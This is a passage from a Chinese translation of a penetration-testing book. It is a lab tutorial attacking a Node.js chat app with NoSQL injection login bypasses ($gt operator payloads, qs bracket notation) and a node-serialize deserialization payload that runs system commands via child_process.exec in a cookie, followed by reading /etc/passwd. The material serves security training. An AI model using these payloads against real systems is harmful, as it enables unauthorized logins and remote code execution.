    中打开"拦截"，单击"登录"，然后以管理员身份提交用户名，并输入密码
    GuessingAdminPassword
-   代理流量并拦截 POST 请求
-   `{"username"："admin"，"password"，"GuessingAdminPassword"} --> {"username"："admin"，"password"：{"$gt"：""}}`{.calibre14
    .pcalibre4 .pcalibre3}
-   你现在应该可以以管理员身份登录！
![](3-17.png){.calibre11}
那么这里发生了什么呢？我们将字符串 \"GuessingAdminPassword\"
更改为JSON对象 `{"$gt":""}`{.calibre14 .pcalibre4 .pcalibre3}，这是 TRUE
语句，因为大于 NULL 的所有内容都为 TRUE。这将 POST 请求更改为
`{"username":"admin", "password":TRUE }`{.calibre14 .pcalibre4
.pcalibre3}，它自动使请求为 TRUE
并以管理员身份登录而不需要知道密码，类似 SQLi 中的 1 = 1 攻击。
**高级 NoSQLi**
NoSQL 注入并不新鲜，但 NodeJS
章节的目的是展示更新的框架和语言以及如何潜在地引进新的漏洞。例如，Node.js
有一个 qs 模块，它具有将 HTTP 请求参数转换为 JSON
对象的特定语法。默认情况下，qs 模块在 Express
中使用"body-parser"中间件的一部分。
-   qs
    模块：一个查询字符串解析和字符串化库，增加了一些安全性。\[[https://www.npmjs.com/package/qs](https://www.npmjs.com/package/qs){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}\]
这是什么意思？如果使用 qs 模块，如果在参数中使用括号表示法，POST
请求将在服务器端转换为 JSON。因此，看起来像用户名 \[value\] =
admin&password \[value\] = admin 的 POST 请求将转换为
`{"username"：{"value"："admin"}，"password"：{"value"："admin" }}`{.calibre14
.pcalibre4 .pcalibre3}。现在，qs 模块也将接受并转换 POST 参数以协助
NoSQLi：
-   例如，我们可以发出如下的 POST 请求：
    -   `username=admin&password[$gt]=`{.calibre14 .pcalibre4
        .pcalibre3}
-   服务器端请求转换将转换为：
    -   `{"username": "admin", "password":{"$gt":""}`{.calibre14
        .pcalibre4 .pcalibre3}
-   现在看起来类似于传统的 NoSQLi 攻击。
现在，我们的请求看起来与上一节中的 NoSQLi 相同。让我们看看这个操作：
-   转到 [http://chat:3000/nosql2](http://chat:3000/nosql2){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   打开 Burp Intercept
-   使用 admin 登录：
-   修改 POST 参数：
-   `username=admin&password[$gt]=&submit=login`{.calibre14 .pcalibre4
    .pcalibre3}
![](3-18.png){.calibre11}
你应该可以使用 admin 登录了！你已使用 Express Framework 使用的 qs
模块解析器执行 NoSQL
注入，作为解析器中间件的一部分。但等等，还有更多！如果你不知道要攻击哪个用户名怎么办？我们可以使用同样的攻击来查找和登录其他帐户吗？
如果不是使用密码的话，那我们也可以尝试使用用户名吗？在这种情况下，NoSQLi
POST 请求看起来像：
-   `username[$gt]=admin&password[$gt]=&submit=login`{.calibre14
    .pcalibre4 .pcalibre3}
上面的 POST 请求实际上是在数据库中查询下一个大于 admin
的用户名，并使用密码字段生成一个 TRUE
语句。如果成功，你应该在管理员之后按字母顺序作为下一个用户登录。继续这样做，直到找到
superaccount 。
更多 NoSQL Payload：
-   [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://blog.websecurify.com/2014/08/hacking-nodejs-andmongodb.html](https://blog.websecurify.com/2014/08/hacking-nodejs-andmongodb.html){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://www.owasp.org/index.php/Testing_for_NoSQL_injection](https://www.owasp.org/index.php/Testing_for_NoSQL_injection){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
### 反序列化攻击 {#3_the_throw_web_application_exploitation.html#反序列化攻击 .calibre15}
在过去的几年中，通过网络进行的序列化/反序列化攻击变得越来越流行。我们在
BlackHat上看到了许多不同的讨论，发现了 Jenkins 和 Apache Struts2
等常见应用程序中的关键漏洞，并且正在开发像
[ysoserial](https://github.com/frohoff/ysoserial){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"}
这样工具的大量活跃研究。那么反序列化攻击有什么厉害之处呢？
在我们开始之前，我们需要了解为什么要序列化。序列化数据有很多原因，但最常用于生成值/数据的可存储表示而不会丢失其类型或结构。序列化将对象转换为字节流，以通过网络传输或存储。通常，转换方法涉及
XML，JSON 或特定于该语言的序列化方法。
NodeJS 中的反序列化\
很多时候，发现复杂的漏洞需要深入了解应用程序。在我们的场景中，Chat
NodeJS 应用程序正在使用易受攻击的 [serialize.js
版本](https://github.com/luin/serialize){.pcalibre2 .calibre9 .pcalibre
.pcalibre1 target="_blank"} 。可以发现这个 Node 库易受攻击，因为
"不受信任的数据被传递到 unserialize() 函数中，攻击者通过传递一个存在
Immediately Invoked Function Expression(IIFE)的 JavaScript
对象可以引起任意代码执行。"（
[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} ）
让我们逐步了解攻击的细节，以便更好地了解正在发生的事情。第一，我们查看了
serialize.js 文件并快速搜索 eval（
[https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=](https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}
）。通常，允许用户输入进入 JavaScript eval 语句是坏的消息，因为
`eval()`{.calibre14 .pcalibre4 .pcalibre3}执行原始
JavaScript。如果攻击者能够将 JavaScript
注入此语句，他们将能够在服务器上执行远程执行代码。
![](3-19.png){.calibre11}
其次，我们需要创建一个序列化的 payload，它将被反序列化，并通过我们的
JavaScript payload `require('child_process').exec('ls')`{.calibre14
.pcalibre4 .pcalibre3}.
``` calibre21
{“thp”:“_$$ND_FUNC$$_function (){require(‘child_process’).exec(‘DO SYSTEM COMMANDS HERE’, function(error, stdout, stderr) { console.log(stdout) });}()”}
```
上面的 JSON
对象将通过以下的请求`(){require('child_process').exec('ls')}`{.calibre14
.pcalibre4 .pcalibre3}进入 unserialize 函数中的 eval
语句，为我们提供远程代码执行。要注意的最后一部分是结尾括号添加了"()"，因为没有它我们的函数就不会被调用。第一个发现此漏洞的研究员
Ajin Abraham 发现，使用立即调用的函数表达式或 IIFE（
[https://en.wikipedia.org/wiki/Immediately-invoked_function_expression](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}
）将允许在创建后执行该函数。有关此漏洞的更多详细信息，请访问：[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} 。
在我们的聊天应用程序示例中，我们将查看 cookie
值，该值正在使用此易受攻击的库进行反序列化：
-   转到 [http://chat:3000](http://chat:3000){.pcalibre2 .calibre9
    .pcalibre .pcalibre1 target="_blank"}
-   代理 burp 中的流量并查看 cookie
-   识别一个 cookie 名称"donotdecodeme"
-   将该 Cookie 复制到 Burp Suite Decoder 和 Base64 中进行解码
![](3-20.png){.calibre11}
![](3-21.png){.calibre11}
如前所述，每种语言都有其独特的地方，NodeJS 也不例外。在 Node/Express/Pug
中，你无法直接写入 Web 目录，但是可以像在 PHP
中一样访问它。必须有一个指向文件夹的指定路径，该文件夹既可写又可访问到公共网络。
**创建有效 payload**
-   在开始之前，请记住实验中的所有这些 payload
    都可以从这里复制粘贴：[http://bit.ly/2qBDrFo](http://bit.ly/2qBDrFo){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   获取原始 payload 并修改你的 shell 执行"\'DO SYSTEM COMMANDS HERE"
``` calibre21
{"thp":"_$$ND_FUNC$$_function(){require('child_process').exec('DO SYSTEM COMMANDS HERE', function(error, stdout, stderr) {console.log(stdout)});}"}
```
-   例：
    ``` calibre21
    {"thp":"_$$ND_FUNC$$_function(){require('child_process').exec('DO SYSTEM COMMANDS HERE', function(error, stdout, stderr) { console.log(stdout) });}()"}
    ```
-   由于原始 Cookie 已编码，我们必须通过 Burp Decoder/Encoder 对我们的
    payload 进行 base64编码 \*示例
    payload：eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxd
-   注销，打开Burp拦截，并转发/（home）请求
    -   将 cookie 修改为新创建的 Base64 payload
-   转发流量，因为公用文件夹是/的路由，你应该能够打开浏览器并转到
    [http://chat:3000/hacked.txt](http://chat:3000/hacked.txt){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   你现在可以进行远程执行代码！随意对此系统进行后期利用。首先尝试访问
    `/etc/passwd`{.calibre14 .pcalibre4 .pcalibre3}。
![](3-22.png){.calibre11}
在 node-serialize
模块的源代码中，我们可以利用函数表达式，这对于使用用户输入执行此操作的任何
JavaScript/NodeJS
应用程序来说都是一个严重的问题。这种糟糕的做法让我们攻陷了这个应用程序。
![](3-23.png){.calibre11}
参考文献：
-   [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://github.com/luin/serialize](https://github.com/luin/serialize){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://snyk.io/test/npm/node-serialize?severity=high&severity=medium&severity=low](https://snyk.io/test/npm/node-serialize?severity=high&severity=medium&severity=low){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}